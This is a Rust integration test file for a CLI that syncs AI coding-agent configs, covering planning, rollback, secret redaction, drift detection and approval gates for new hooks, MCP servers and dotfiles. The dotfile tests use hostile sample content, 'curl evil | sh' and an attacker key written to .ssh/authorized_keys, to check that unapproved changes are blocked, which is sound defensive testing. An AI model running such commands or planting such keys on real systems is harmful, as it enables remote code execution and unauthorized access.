//! Ticket #9 — Application engine: plan, sync, generations, rollback, drift.
//!
//! RED phase: these tests describe the intended behaviour. They must fail until
//! `src/engine.rs` and the new `plan`/`sync`/`rollback` commands exist.
//!
//! Assumed surface (to be confirmed/refined by the implementer):
//! - `muster plan` / `muster sync --dry-run`: diff desired vs current, no writes, exit 0.
//! - `muster sync --yes`: applies changes, records a numbered generation in the state dir.
//! - `muster rollback <generation> --yes`: restores files to that generation's exact state.
//! - Secret references (e.g. `native://group/name`) never appear resolved in plans/diffs.
//! - New hooks or MCP servers require explicit approval: no TTY, no `--yes` → exit 2.
//! - Unmanaged keys in agent configs are preserved; drift is detected and reported.

mod support;

use support::MusterEnv;

fn state_dir(env: &MusterEnv) -> std::path::PathBuf {
    env.path().join(".local/state").join("muster")
}

/// Initialize the config repo and seed a manifest enabling `claude` with
/// shared instructions and one MCP server whose env holds a secret reference.
fn init_and_seed(env: &MusterEnv, extra_manifest: &str) {
    env.run(&["--format", "json", "--yes", "init"])
        .assert()
        .code(0);

    let cfg = env.config_dir();
    std::fs::write(cfg.join("AGENTS.md"), "# Shared rules\n\nBe concise.\n").expect("AGENTS.md");
    std::fs::write(
        cfg.join("muster.toml"),
        format!(
            r#"
version = 1

[agents]
enabled = ["claude"]

[agents.instructions]
source = "AGENTS.md"
{extra_manifest}

[mcp.github]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-github"]

[mcp.github.env]
GITHUB_TOKEN = "native://tokens/github"
"#
        ),
    )
    .expect("write manifest");

    // The vault group holding the secret value the ref points at.
    let secret_value = "ghp_SUPERSECRETVALUE0123456789";
    env.run(&[
        "secret",
        "add",
        "--format",
        "json",
        "--yes",
        "tokens/github",
        "--value-stdin",
    ])
    .write_stdin(secret_value.as_bytes())
    .assert()
    .code(0);
}

fn all_json(env: &MusterEnv, args: &[&str]) -> (std::process::Output, support::Envelope) {
    let mut full = vec!["--format", "json"];
    full.extend_from_slice(args);
    env.run_json(&full)
}

fn claude_settings(env: &MusterEnv) -> std::path::PathBuf {
    env.path().join(".claude").join("settings.json")
}

fn stdout_of(output: &std::process::Output) -> String {
    String::from_utf8_lossy(&output.stdout).to_string()
}

fn stderr_of(output: &std::process::Output) -> String {
    String::from_utf8_lossy(&output.stderr).to_string()
}

// ---------------------------------------------------------------------------
// 1. plan and sync --dry-run: no writes, exit 0
// ---------------------------------------------------------------------------

#[test]
fn plan_reports_additions_without_writing_anything() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");

    // Nothing applied yet: plan must show pending additions...
    let (output, envelope) = all_json(&env, &["plan"]);
    assert!(output.status.success(), "plan must exit 0");
    assert!(envelope.ok(), "plan envelope ok=true");
    let text = format!("{}{}", stdout_of(&output), stderr_of(&output));
    assert!(
        text.to_lowercase().contains("add")
            || serde_json::to_string(envelope.result())
                .unwrap()
                .to_lowercase()
                .contains("add"),
        "plan must report file additions:\n{text}"
    );

    // ...and must not write anything: the managed file still does not exist.
    assert!(
        !claude_settings(&env).exists(),
        "plan must not create managed files"
    );
}

#[test]
fn sync_dry_run_behaves_like_plan_no_disk_changes_exit_zero() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");

    let (output, _envelope) = all_json(&env, &["sync", "--dry-run"]);
    assert!(
        output.status.success(),
        "sync --dry-run must exit 0 (valid plan)"
    );
    assert!(
        !claude_settings(&env).exists(),
        "sync --dry-run must not create managed files"
    );

    // Every mutating command honours --dry-run: also idempotent when run twice.
    let (again, _e) = all_json(&env, &["sync", "--dry-run"]);
    assert!(again.status.success());
}

// ---------------------------------------------------------------------------
// 2. Idempotence: two syncs in a row, the second applies nothing
// ---------------------------------------------------------------------------

#[test]
fn second_sync_produces_no_changes_clean_apply() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");

    let (first, _e1) = all_json(&env, &["sync", "--yes"]);
    assert!(first.status.success(), "first sync must succeed");
    assert!(
        claude_settings(&env).exists(),
        "first sync must apply managed files"
    );

    let (second, e2) = all_json(&env, &["sync", "--yes"]);
    assert!(
        second.status.success(),
        "second sync must exit 0:\n{}",
        stderr_of(&second)
    );
    assert!(e2.ok(), "second sync envelope ok=true");

    // Clean apply: no additions/modifications pending after the first sync.
    let serialized = serde_json::to_string(e2.result()).unwrap().to_lowercase();
    let text = format!("{}{}", stdout_of(&second), stderr_of(&second)).to_lowercase();
    let combined = format!("{serialized}{text}");
    assert!(
        !combined.contains("\"add\"") && !combined.contains("addition"),
        "second sync must report no changes:\n{combined}"
    );
}

// ---------------------------------------------------------------------------
// 3. Generations & rollback
// ---------------------------------------------------------------------------

#[test]
fn each_sync_records_a_generation_and_rollback_restores_exact_state() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");

    let (g1_out, _e) = all_json(&env, &["sync", "--yes"]);
    assert!(g1_out.status.success(), "sync 1 must succeed");
    assert!(
        !state_dir(&env)
            .read_dir()
            .map(|mut d| d.next().is_none())
            .unwrap_or(true),
        "state dir must hold generation records after sync"
    );
    let agents_file = env.path().join(".claude").join("AGENTS.md");
    let gen1 = std::fs::read_to_string(&agents_file).expect("AGENTS.md exists");

    // Change the desired state (instructions change) and sync again.
    let cfg = env.config_dir();
    std::fs::write(cfg.join("AGENTS.md"), "# Shared rules\n\nBe VERY terse.\n").expect("AGENTS.md");
    let (g2_out, _e) = all_json(&env, &["sync", "--yes"]);
    assert!(g2_out.status.success(), "sync 2 must succeed");
    let gen2 = std::fs::read_to_string(&agents_file).expect("AGENTS.md exists");
    assert_ne!(
        gen1, gen2,
        "generation 2 must reflect the changed desired state"
    );

    // Rollback restores the exact generation 1 contents.
    let (rb_out, rb_env) = all_json(&env, &["rollback", "1", "--yes"]);
    assert!(
        rb_out.status.success(),
        "rollback must exit 0:\n{}",
        stderr_of(&rb_out)
    );
    assert!(rb_env.ok(), "rollback envelope ok=true");
    assert_eq!(
        std::fs::read_to_string(&agents_file).expect("AGENTS.md exists"),
        gen1,
        "rollback 1 must restore generation 1 exact file state"
    );
}

fn claude_settings_contents(env: &MusterEnv) -> String {
    std::fs::read_to_string(claude_settings(env)).expect("claude settings.json exists after sync")
}

#[test]
fn generations_are_listed_in_state_dir_after_sync() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    let (_o, e) = all_json(&env, &["sync", "--yes"]);
    assert!(e.ok());

    // Either a generations file/dir under the state dir or the sync result
    // reports the generation number; both must expose generation 1.
    let result = serde_json::to_string(e.result()).unwrap_or_default();
    let state_has_gen = std::fs::read_dir(state_dir(&env))
        .map(|entries| {
            entries.filter_map(|e| e.ok()).any(|ent| {
                let name = ent.file_name().to_string_lossy().to_lowercase();
                name.contains("generation") || name.contains("gen")
            })
        })
        .unwrap_or(false);
    assert!(
        state_has_gen || result.contains("generation"),
        "sync must record generation info in the state dir or its result: {result}"
    );
}

// ---------------------------------------------------------------------------
// 4. Secrets hygiene: plans and diffs never contain secret values
// ---------------------------------------------------------------------------

#[test]
fn plan_and_sync_never_leak_secret_values() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    let secret_value = "ghp_SUPERSECRETVALUE0123456789";

    let (plan_out, _p) = all_json(&env, &["plan"]);
    let plan_text = format!("{}{}", stdout_of(&plan_out), stderr_of(&plan_out));
    assert!(
        !plan_text.contains(secret_value),
        "plan must never contain the secret value in plaintext"
    );
    assert!(
        plan_text.contains("native://tokens/github")
            || plan_text.contains("<redacted>")
            || plan_text.contains("<secret"),
        "plan must show the secret as a redacted reference:\n{plan_text}"
    );

    let (sync_out, _s) = all_json(&env, &["sync", "--yes"]);
    assert!(sync_out.status.success());
    let sync_text = format!("{}{}", stdout_of(&sync_out), stderr_of(&sync_out));
    assert!(
        !sync_text.contains(secret_value),
        "sync output must never contain the secret value in plaintext"
    );

    // Diffs after a change must also stay clean.
    let cfg = env.config_dir();
    std::fs::write(cfg.join("AGENTS.md"), "# Shared rules\n\nBe terse.\n").expect("AGENTS.md");
    let (plan2_out, _p2) = all_json(&env, &["plan"]);
    let diff_text = format!("{}{}", stdout_of(&plan2_out), stderr_of(&plan2_out));
    assert!(
        !diff_text.contains(secret_value),
        "diff must never contain the secret value in plaintext"
    );
}

// ---------------------------------------------------------------------------
// 5. New hooks / MCP servers require explicit approval
// ---------------------------------------------------------------------------

#[test]
fn new_hook_without_approval_is_not_installed_non_tty_fails_exit_2() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    let (_o, _e) = all_json(&env, &["sync", "--yes"]); // baseline applied

    // Declare a NEW hook in the manifest.
    let cfg = env.config_dir();
    std::fs::write(
        cfg.join("muster.toml"),
        r#"
version = 1

[agents]
enabled = ["claude"]

[agents.instructions]
source = "AGENTS.md"

[agents.hooks.pre_tool_use]
command = "/bin/echo hook-ran"
matcher = "Bash"

[mcp.github]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-github"]

[mcp.github.env]
GITHUB_TOKEN = "native://tokens/github"
"#,
    )
    .expect("manifest with new hook");

    // No TTY and no --yes: must refuse with exit code 2 (confirmation required).
    let (out, envelope) = all_json(&env, &["sync"]);
    assert_eq!(
        out.status.code(),
        Some(2),
        "new hook without approval must exit 2:\n{}{}",
        stdout_of(&out),
        stderr_of(&out)
    );
    assert!(!envelope.ok(), "refused sync must emit ok=false envelope");

    // The new hook must NOT have been installed.
    let settings = claude_settings_contents(&env);
    assert!(
        !settings.contains("hook-ran") && !settings.contains("pre_tool_use"),
        "unapproved new hook must not be installed:\n{settings}"
    );

    // With explicit --yes the approval gate opens and the hook lands.
    let (yes_out, _e) = all_json(&env, &["sync", "--yes"]);
    assert!(yes_out.status.success(), "sync --yes must approve the hook");
    let settings = claude_settings_contents(&env);
    assert!(
        settings.contains("hook-ran") || settings.contains("pre_tool_use"),
        "approved hook must be installed:\n{settings}"
    );
}

#[test]
fn new_mcp_server_without_approval_is_not_installed_non_tty_fails_exit_2() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    let (_o, _e) = all_json(&env, &["sync", "--yes"]); // baseline: only github MCP

    // Declare a NEW MCP server.
    let cfg = env.config_dir();
    let manifest = std::fs::read_to_string(cfg.join("muster.toml")).expect("manifest");
    let manifest = format!(
        "{manifest}\n[mcp.filesystem]\ncommand = \"npx\"\nargs = [\"-y\", \"@modelcontextprotocol/server-filesystem\"]\n"
    );
    std::fs::write(cfg.join("muster.toml"), manifest).expect("manifest with new mcp server");

    let (out, _envelope) = all_json(&env, &["sync"]);
    assert_eq!(
        out.status.code(),
        Some(2),
        "new MCP server without approval must exit 2:\n{}{}",
        stdout_of(&out),
        stderr_of(&out)
    );

    // Not installed anywhere: check the managed MCP config for the new server.
    let claude_dir = env.path().join(".claude");
    let mut combined = String::new();
    if let Ok(entries) = std::fs::read_dir(&claude_dir) {
        for ent in entries.filter_map(|e| e.ok()) {
            if let Ok(c) = std::fs::read_to_string(ent.path()) {
                combined.push_str(&c);
            }
        }
    }
    assert!(
        !combined.contains("server-filesystem"),
        "unapproved new MCP server must not be installed:\n{combined}"
    );
}

// ---------------------------------------------------------------------------
// 6. Manual edits preservation & drift
// ---------------------------------------------------------------------------

#[test]
fn unmanaged_keys_in_agent_configs_are_preserved_after_sync() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    let (_o, _e) = all_json(&env, &["sync", "--yes"]);

    // Manual edit of an unmanaged key in the agent config.
    let settings_path = claude_settings(&env);
    let settings = claude_settings_contents(&env);
    assert!(
        !settings.contains("userCustomKey"),
        "sanity: key not yet present"
    );
    let edited = if let Ok(mut v) = serde_json::from_str::<serde_json::Value>(&settings) {
        v["userCustomKey"] = serde_json::json!("keep-me");
        serde_json::to_string_pretty(&v).expect("serialize")
    } else {
        format!("{settings}\n// userCustomKey: keep-me\n")
    };
    std::fs::write(&settings_path, edited).expect("manual edit");

    let (_o, e) = all_json(&env, &["sync", "--yes"]);
    assert!(e.ok(), "sync after manual edit must succeed");

    let after = claude_settings_contents(&env);
    assert!(
        after.contains("keep-me") || after.contains("userCustomKey"),
        "unmanaged keys must be preserved across sync:\n{after}"
    );
}

#[test]
fn drift_between_desired_state_and_disk_is_detected_and_reported() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    let (_o, _e) = all_json(&env, &["sync", "--yes"]);

    // Drift: someone rewrites a managed key (and adds an unmanaged one)
    // behind Muster's back.
    let mcp_path = env.path().join(".claude.json");
    std::fs::write(
        &mcp_path,
        r#"{"drifted": true, "mcpServers": {"github": {"command": "evil"}}}"#,
    )
    .expect("drift the file");

    // plan must detect and report the drift as a pending modification.
    let (plan_out, plan) = all_json(&env, &["plan"]);
    assert!(plan_out.status.success(), "plan must exit 0 over drift");
    let plan_text = format!("{}{}", stdout_of(&plan_out), stderr_of(&plan_out));
    let plan_lower = plan_text.to_lowercase();
    assert!(
        plan_lower.contains("modif") || plan_lower.contains("drift") || plan_lower.contains("diff"),
        "plan must report drift between desired state and disk:\n{plan_text}"
    );
    assert!(
        plan.diagnostics()
            .as_array()
            .expect("diagnostics")
            .iter()
            .any(|d| d["code"] == "drift"),
        "drift must be reported as a diagnostic:\n{plan_text}"
    );

    // sync repairs the managed key and keeps the manual, unmanaged edit.
    let (sync_out, _s) = all_json(&env, &["sync", "--yes"]);
    assert!(sync_out.status.success(), "sync must succeed over drift");
    let repaired = std::fs::read_to_string(&mcp_path).expect("read repaired");
    assert!(
        !repaired.contains("evil") && repaired.contains("server-github"),
        "sync must restore the drifted managed key:\n{repaired}"
    );
    assert!(
        repaired.contains("drifted"),
        "manual edits outside managed keys are preserved:\n{repaired}"
    );
}

// ---------------------------------------------------------------------------
// 7. Project-scoped configuration (Spec story 29)
// ---------------------------------------------------------------------------

#[test]
fn project_scoped_configuration_applies_to_project_root() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    all_json(&env, &["sync", "--yes"]);

    // Set up a project repo with its own .muster/muster.toml
    let project = env.path().join("my-project");
    let muster_dir = project.join(".muster");
    std::fs::create_dir_all(&muster_dir).expect("create .muster");
    std::fs::write(
        muster_dir.join("muster.toml"),
        r#"
version = 1

[agents]
enabled = ["claude"]

[mcp.project_tool]
command = "cargo"
args = ["run", "--bin", "tool"]
"#,
    )
    .expect("write project manifest");

    let proj_str = project.to_str().unwrap();
    let (plan_out, plan_env) = all_json(&env, &["plan", "--project", proj_str]);
    assert!(plan_out.status.success(), "plan --project must succeed");
    assert!(plan_env.ok());

    let (sync_out, sync_env) = all_json(&env, &["sync", "--project", proj_str, "--yes"]);
    assert!(sync_out.status.success(), "sync --project must succeed");
    assert!(sync_env.ok());

    // Claude project-scoped MCP is written to <project>/.mcp.json
    let project_mcp = project.join(".mcp.json");
    assert!(
        project_mcp.is_file(),
        "project MCP config must be created in project root"
    );
    let contents = std::fs::read_to_string(project_mcp).expect("read project .mcp.json");
    assert!(
        contents.contains("project_tool"),
        "project .mcp.json must hold project_tool: {contents}"
    );
}

// ---------------------------------------------------------------------------
// 8. Stale managed entries are removed using ownership records
// ---------------------------------------------------------------------------

#[test]
fn removed_mcp_server_is_pruned_but_user_servers_are_kept() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    let (first, _e) = all_json(&env, &["sync", "--yes"]);
    assert!(first.status.success());

    // The user adds their own server next to the managed one.
    let mcp_path = env.path().join(".claude.json");
    let mut config: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&mcp_path).expect("claude.json"))
            .expect("json");
    config["mcpServers"]["mine"] = serde_json::json!({ "command": "my-tool" });
    std::fs::write(&mcp_path, serde_json::to_string_pretty(&config).unwrap()).expect("edit");

    // github is no longer declared.
    let cfg = env.config_dir();
    std::fs::write(
        cfg.join("muster.toml"),
        "version = 1\n\n[agents]\nenabled = [\"claude\"]\n\n[agents.instructions]\nsource = \"AGENTS.md\"\n",
    )
    .expect("manifest without github");

    let (out, envelope) = all_json(&env, &["sync", "--yes"]);
    assert!(out.status.success(), "{}", envelope.raw);
    let after = std::fs::read_to_string(&mcp_path).expect("claude.json");
    assert!(
        !after.contains("server-github"),
        "stale managed server must be removed:\n{after}"
    );
    assert!(
        after.contains("my-tool"),
        "user server must be kept:\n{after}"
    );
}

#[cfg(unix)]
#[test]
fn sync_adopts_a_dotfiles_symlink_instead_of_failing_and_warns() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    // A dotfiles manager (chezmoi, stow, yadm) linked CLAUDE.md to a shared file.
    let shared = env.path().join(".agents").join("AGENTS.md");
    std::fs::create_dir_all(shared.parent().unwrap()).expect("agents dir");
    std::fs::write(&shared, "dotfiles copy\n").expect("shared file");
    let claude_md = env.path().join(".claude").join("CLAUDE.md");
    std::fs::create_dir_all(claude_md.parent().unwrap()).expect("claude dir");
    std::os::unix::fs::symlink("../.agents/AGENTS.md", &claude_md).expect("symlink");

    let (out, envelope) = all_json(&env, &["sync", "--yes"]);

    assert!(out.status.success(), "sync must exit 0: {}", envelope.raw);
    let meta = std::fs::symlink_metadata(&claude_md).expect("CLAUDE.md exists");
    assert!(
        meta.file_type().is_file(),
        "CLAUDE.md must now be a regular file, not a symlink"
    );
    let written = std::fs::read_to_string(&claude_md).expect("read CLAUDE.md");
    assert!(
        written.contains("@AGENTS.md"),
        "CLAUDE.md must import the shared rules:\n{written}"
    );
    assert_eq!(
        std::fs::read_to_string(&shared).expect("read shared"),
        "dotfiles copy\n",
        "the symlink target must not be modified"
    );
    let warning = envelope
        .diagnostics()
        .as_array()
        .expect("diagnostics")
        .iter()
        .find(|d| d["code"] == "symlink_replaced")
        .unwrap_or_else(|| {
            panic!(
                "a symlink_replaced diagnostic is expected:\n{}",
                envelope.raw
            )
        });
    assert_eq!(warning["severity"], "warning");
    assert!(
        warning["path"]
            .as_str()
            .is_some_and(|p| p.ends_with(".claude/CLAUDE.md")),
        "the warning names the replaced path: {warning}"
    );
    assert!(
        warning["message"]
            .as_str()
            .is_some_and(|m| m.contains("../.agents/AGENTS.md")),
        "the warning names the old link target: {warning}"
    );
}

// ---------------------------------------------------------------------------
// 6. Managed dotfiles are executable-adjacent: they need approval too
// ---------------------------------------------------------------------------

fn declare_dotfile(env: &MusterEnv, target: &str, body: &str) {
    let cfg = env.config_dir();
    std::fs::create_dir_all(cfg.join("files")).expect("files dir");
    std::fs::write(cfg.join("files/payload"), body).expect("payload");
    let manifest = std::fs::read_to_string(cfg.join("muster.toml")).expect("manifest");
    let manifest = manifest.split("\n[files.").next().unwrap().to_owned();
    std::fs::write(
        cfg.join("muster.toml"),
        format!("{manifest}\n[files.\"{target}\"]\nsource = \"files/payload\"\n"),
    )
    .expect("manifest with dotfile");
}

#[test]
fn unapproved_dotfile_is_not_applied_unattended() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    all_json(&env, &["sync", "--yes"]);
    declare_dotfile(&env, ".ssh/authorized_keys", "ssh-ed25519 AAAAattacker\n");

    let (out, _e) = all_json(&env, &["sync"]);
    assert_eq!(out.status.code(), Some(2), "{}", stdout_of(&out));
    assert!(!env.path().join(".ssh/authorized_keys").exists());

    let (plan, _p) = all_json(&env, &["plan"]);
    assert!(
        stdout_of(&plan).contains("\"dotfile\""),
        "{}",
        stdout_of(&plan)
    );
}

#[test]
fn approved_dotfile_applies_and_does_not_reprompt_until_content_changes() {
    let env = MusterEnv::new();
    init_and_seed(&env, "");
    declare_dotfile(&env, ".bashrc-muster", "echo one\n");
    let (out, _e) = all_json(&env, &["sync", "--yes"]);
    assert!(out.status.success(), "{}", stdout_of(&out));
    assert_eq!(
        std::fs::read_to_string(env.path().join(".bashrc-muster")).unwrap(),
        "echo one\n"
    );

    // Unchanged: unattended sync is fine.
    let (out, _e) = all_json(&env, &["sync"]);
    assert!(out.status.success(), "{}", stdout_of(&out));

    // Content changed remotely: needs approval again.
    declare_dotfile(&env, ".bashrc-muster", "curl evil | sh\n");
    let (out, _e) = all_json(&env, &["sync"]);
    assert_eq!(out.status.code(), Some(2), "{}", stdout_of(&out));
    assert_eq!(
        std::fs::read_to_string(env.path().join(".bashrc-muster")).unwrap(),
        "echo one\n"
    );
}
